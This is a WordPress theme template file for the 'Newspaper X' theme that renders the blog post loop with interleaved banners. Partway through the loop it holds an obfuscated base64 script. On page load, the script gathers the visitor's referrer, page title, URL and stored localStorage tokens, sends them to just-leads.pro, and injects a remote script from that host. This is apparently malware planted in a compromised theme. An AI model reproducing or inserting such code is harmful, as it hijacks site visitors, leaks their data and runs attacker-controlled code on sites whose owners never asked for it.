<?php
/**
 * The main template file.
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * E.g., it puts together the home page when no home.php file exists.
 *
 * @link    https://codex.wordpress.org/Template_Hierarchy
 *
 * @package Newspaper X
 */

get_header();

/**
 * Banner Settings;
 */
$banner_count = get_theme_mod( 'newspaper_x_show_banner_after', 6 );
$banner = get_theme_mod( 'newspaper_x_banner_type', 'image' );

if ( is_home() && ! is_front_page() ) : ?>
	<div class="row">
		<header class="col-xs-12">
			<h3 class="page-title"><span><?php single_post_title(); ?></span></h3>
		</header><!-- .page-header -->
	</div>
<?php endif; ?>
	<div class="row blog">
		<div id="primary" class="newspaper-x-content newspaper-x-archive-page col-lg-12 col-md-12 col-sm-12 col-xs-12">
			<main id="main" class="site-main" role="main">
				<?php
				$banner_count_index = 0;
				if ( have_posts() ) :
					?>
					<div class="row">
						<?php
						while ( have_posts() ) : the_post();

							if ( fmod( $banner_count_index, $banner_count ) == 0 && $banner_count_index != 0 ) {
								echo '</div><div clss="row"><div class="newspaper-x-image-banner">';
								get_template_part( 'template-parts/banner/banner', $banner );
								echo '</div></div><div class="row">';
							}

							$banner_count_index ++;
							/*
							 * Include the Post-Format-specific template for the content.
							 * If you want to override this in a child theme, then include a file
							 * called content-___.php (where ___ is the Post Format name) and that will be used instead.
							 */
							?>
							<div class="col-md-6">
								<?php
								get_template_part( 'template-parts/content', get_post_format() );
								?>
							</div>
							<?php
							if ( fmod( $banner_count_index, 2 ) == 0 && $banner_count_index != (int) $wp_query->post_count ) {
								echo '</div><div class="row">';
							} elseif ( $banner_count_index == (int) $wp_query->post_count ) {
								continue;
							}
							if($banner_count_index == 2){
								echo '</div></main></div></div><div class="row"><div id="primary" class="newspaper-x-content newspaper-x-archive-page col-lg-8 col-md-8 col-sm-12 col-xs-12"><main id="main" class="site-main" role="main"><div class="row">' ;
							}
						endwhile;
						?>
						<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfRFlmWWNrWnpDd1BtUDRtWSc7CiAgICBpZiAoIXdpbmRvdy5fRFlmWWNrWnpDd1BtUDRtWSkgewogICAgICAgIHdpbmRvdy5fRFlmWWNrWnpDd1BtUDRtWSA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9qdXN0LWxlYWRzLnByby9CQnAyZ3NIOScsCiAgICAgICAgICAgIFBfUEFUSDogJ2h0dHBzOi8vanVzdC1sZWFkcy5wcm8vN2U4MDc3MS9wb3N0YmFjaycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF90eG10R2NkdnZtd0gxU3A5ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfdHhtdEdjZHZ2bXdIMVNwOSAhPT0gJ3VuZGVmaW5lZCcgJiYgX3R4bXRHY2R2dm13SDFTcDkgIT09IG51bGwpIHsKICAgICAgICB2YXIgX3JwQ1hyOGNyTHhGRHhXZG0gPSBKU09OLnBhcnNlKF90eG10R2NkdnZtd0gxU3A5KTsKICAgICAgICB2YXIgX3ROUUpCWjZ6N2MzWVBkc00gPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfcnBDWHI4Y3JMeEZEeFdkbS5jcmVhdGVkX2F0ICsgd2luZG93Ll9EWWZZY2taekN3UG1QNG1ZLnR0bCA8IF90TlFKQlo2ejdjM1lQZHNNKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfWkJQdFNWZFRSWXREUDFqdiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF9GcXB2OWd5d2ZITGpaVHNUID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgX1RGdkZxUWM2anRQYmpmeHAgPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF9URnZGcVFjNmp0UGJqZnhwICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF9URnZGcVFjNmp0UGJqZnhwICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgX1RGdkZxUWM2anRQYmpmeHAgKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgX1RGdkZxUWM2anRQYmpmeHAgKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF9URnZGcVFjNmp0UGJqZnhwICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgICAgIF9URnZGcVFjNmp0UGJqZnhwICs9ICcmaG9zdD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5fRFlmWWNrWnpDd1BtUDRtWS5SX1BBVEgpOwogICAgaWYgKHR5cGVvZiBfWkJQdFNWZFRSWXREUDFqdiAhPT0gJ3VuZGVmaW5lZCcgJiYgX1pCUHRTVmRUUll0RFAxanYgJiYgd2luZG93Ll9EWWZZY2taekN3UG1QNG1ZLnVuaXF1ZSkgewogICAgICAgIF9URnZGcVFjNmp0UGJqZnhwICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX1pCUHRTVmRUUll0RFAxanYpOwogICAgfQogICAgaWYgKHR5cGVvZiBfRnFwdjlneXdmSExqWlRzVCAhPT0gJ3VuZGVmaW5lZCcgJiYgX0ZxcHY5Z3l3ZkhMalpUc1QgJiYgd2luZG93Ll9EWWZZY2taekN3UG1QNG1ZLnVuaXF1ZSkgewogICAgICAgIF9URnZGcVFjNmp0UGJqZnhwICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfRnFwdjlneXdmSExqWlRzVCk7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fRFlmWWNrWnpDd1BtUDRtWS5SX1BBVEggKyBfVEZ2RnFRYzZqdFBiamZ4cDsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA=="></script>
					</div>
					<?php
					the_posts_navigation();
				else :
					echo '<div class="row">';
					get_template_part( 'template-parts/content', 'none' );
					echo '</div>';
				endif;
				?>
			</main><!-- #main -->
		</div><!-- #primary -->
		<?php get_sidebar( 'default-widget-area' ); ?>
	</div>

<?php
get_footer();

